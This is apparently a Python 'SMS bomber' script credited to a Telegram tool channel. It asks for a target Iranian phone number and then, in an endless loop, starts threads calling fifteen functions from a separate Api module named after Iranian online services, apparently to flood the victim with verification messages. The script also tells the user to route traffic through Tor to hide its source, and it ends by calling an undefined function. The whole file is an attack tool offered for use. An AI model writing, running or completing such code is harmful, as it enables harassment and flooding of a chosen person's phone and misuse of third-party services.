from os import system
from os import name
from time import sleep
from time import time
from requests import post
from threading import Thread
from re import search
from datetime import datetime
import Api
from colorama import Fore
system("clear")
def print_slow(txt):
        for x in txt:                     # cycle through the text one character at a time
            print(x, end='', flush=True)  # print one character, no new line, flush buffer
            sleep(0.05)
        print() # go to new line
print(f"{Fore.RED}≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈\n")
print_slow(f"          {Fore.GREEN}>>> {Fore.RED}Coder {Fore.GREEN}>>>{Fore.RED} @IM_YES_OR_NO {Fore.GREEN}<<<\n          {Fore.GREEN}>>> {Fore.RED}Channel {Fore.GREEN}>>>{Fore.RED} @VipTools_official {Fore.GREEN}<<<")
print(f"\n{Fore.RED}≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈\n")

lice = "join @VipTools_official"
lice_1 = input(f"{Fore.RED}[+] {Fore.GREEN} Enter Your License Code >>> {Fore.YELLOW}")

while lice_1 != lice : 
    system("clear")
    lice_1 = input(f"""{Fore.RED}≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈\n
          {Fore.GREEN}>>> {Fore.RED}Coder {Fore.GREEN}>>>{Fore.RED} @IM_YES_OR_NO {Fore.GREEN}<<<
          {Fore.GREEN}>>> {Fore.RED}Channel {Fore.GREEN}>>>{Fore.RED} @VipTools_official {Fore.GREEN}<<<
          
{Fore.RED}≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈\n
{Fore.RED}[+] {Fore.GREEN} Enter Your License Code >>> {Fore.YELLOW}""")

system("clear")

text = input(f"""{Fore.RED}≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈\n
          {Fore.GREEN}>>> {Fore.RED}Coder {Fore.GREEN}>>>{Fore.RED} @IM_YES_OR_NO {Fore.GREEN}<<<
          {Fore.GREEN}>>> {Fore.RED}Channel {Fore.GREEN}>>>{Fore.RED} @VipTools_official {Fore.GREEN}<<<
          
{Fore.RED}≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈\n
{Fore.RED}[+] {Fore.GREEN} Enter Your Target Phone >>>{Fore.RED} +98{Fore.YELLOW}""")
phone = '+98'+text
while len(phone) != 13 : 
    system("clear")
    text = input(f"""{Fore.RED}≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈\n
          {Fore.GREEN}>>> {Fore.RED}Coder {Fore.GREEN}>>>{Fore.RED} @IM_YES_OR_NO {Fore.GREEN}<<<
          {Fore.GREEN}>>> {Fore.RED}Channel {Fore.GREEN}>>>{Fore.RED} @VipTools_official {Fore.GREEN}<<<
          
{Fore.RED}≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈\n
{Fore.RED}[+] {Fore.GREEN} Enter Your Target Phone >>>{Fore.RED} +98{Fore.YELLOW}""")
    phone = '+98'+text

if phone[0:4] == "+989" and len(phone) == 13:
    system("clear")
    proxy = {"https":"127.0.0.1:8000"}
    
    try:
        post('https://google.com'  )
    except:
        print('\033[0;31m[!]Error!\n\033[0;31m[!](1 eshtebah rokh dade)tor ro ba dastor badi ejra konid : \033[0;94mtor HTTPTunnelPort 8000')
        exit(0)
    if phone[0:4] == "+989":
        start = time()
        co = 1
        while True:
            Thread(target=Api.snap, args=[phone]).start()
            Thread(target=Api.shad, args=[phone]).start()
            Thread(target=Api.gap, args=[phone]).start()
            Thread(target=Api.tap30, args=[phone]).start()
            Thread(target=Api.emtiaz, args=[phone]).start()
            Thread(target=Api.divar, args=[phone]).start()
            Thread(target=Api.rubika, args=[phone]).start()
            Thread(target=Api.torob, args=[phone]).start()
            Thread(target=Api.bama, args=[phone]).start()
            Thread(target=Api.snapfood, args=[phone]).start()
            Thread(target=Api.sheypoor, args=[phone]).start()
            Thread(target=Api.alibaba, args=[phone]).start()
            Thread(target=Api.smarket, args=[phone]).start()
            Thread(target=Api.arka, args=[phone]).start()
            Thread(target=Api.sTrip, args=[phone]).start()
else : 
    print(f"{Fore.GREEN}[+]{Fore.RED} shomare Eshtebahe ")
    som()